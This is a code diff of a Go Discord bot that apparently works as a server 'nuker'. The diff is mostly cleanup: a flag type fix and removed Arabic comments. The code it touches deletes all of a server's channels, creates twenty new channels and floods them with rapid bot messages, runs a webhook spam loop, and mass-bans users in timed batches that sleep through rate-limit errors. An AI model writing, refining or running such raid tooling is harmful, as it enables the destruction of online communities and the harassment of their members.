@@ -73,7 +73,7 @@ func main() {
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
 					Content: "Starting webhook pool loop...",
-					Flags:   uint64(discordgo.MessageFlagsEphemeral),
+					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
 			go runWebhookLoop(token, i.ChannelID, "spam-wh", "Spam Message", 50, 10, 3*time.Second)
@@ -83,7 +83,7 @@ func main() {
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
 					Content: "Executing precise interval workflow...",
-					Flags:   uint64(discordgo.MessageFlagsEphemeral),
+					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
 			go runPreciseWorkflow(s, i.GuildID, "Message from bot")
@@ -224,7 +224,6 @@ func runPreciseWorkflow(s *discordgo.Session, guildID string, messageContent str
 		for _, ch := range channels {
 			_, err := s.ChannelDelete(ch.ID)
 			if err != nil {
-				// معالجة بسيطة في حال الـ Rate Limit من مكتبة discordgo
 				time.Sleep(1 * time.Second)
 			}
 			time.Sleep(30 * time.Millisecond)
@@ -251,18 +250,15 @@ func runPreciseWorkflow(s *discordgo.Session, guildID string, messageContent str
 	}
 
 	// ج. إنشاء الرومات ورسايل البوت:
-	// - روم كل 30 ملي ثانية
-	// - رسالة من البوت نفسه كل 20 ملي ثانية
-	for i := 0; i < 20; i++ { // عدد الرومات كمثال
+	for i := 0; i < 20; i++ {
 		newChannel, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
 			Name: fmt.Sprintf("room-%d", i+1),
 			Type: discordgo.ChannelTypeGuildText,
 		})
 		
 		if err == nil && newChannel != nil {
-			// إرسال رسائل متكررة من البوت نفسه كل 20 ملي ثانية داخل الروم
 			go func(chID string) {
-				for m := 0; m < 5; m++ { // عدد الرسائل في كل روم
+				for m := 0; m < 5; m++ {
 					s.ChannelMessageSend(chID, messageContent)
 					time.Sleep(20 * time.Millisecond)
 				}
@@ -273,12 +269,11 @@ func runPreciseWorkflow(s *discordgo.Session, guildID string, messageContent str
 	}
 }
 
-// دالة مساعدة لتنفيذ دفعة الباند (50 شخص، وكل شخص بينه 100 ملي ثانية)
 func processBansBatch(s *discordgo.Session, guildID string, userIDs []string) {
 	for _, userID := range userIDs {
 		err := s.GuildBanCreate(guildID, userID, 1)
 		if err != nil {
-			time.Sleep(1 * time.Second) // معالجة Rate Limit للباند
+			time.Sleep(1 * time.Second)
 		}
 		time.Sleep(100 * time.Millisecond)
 	}
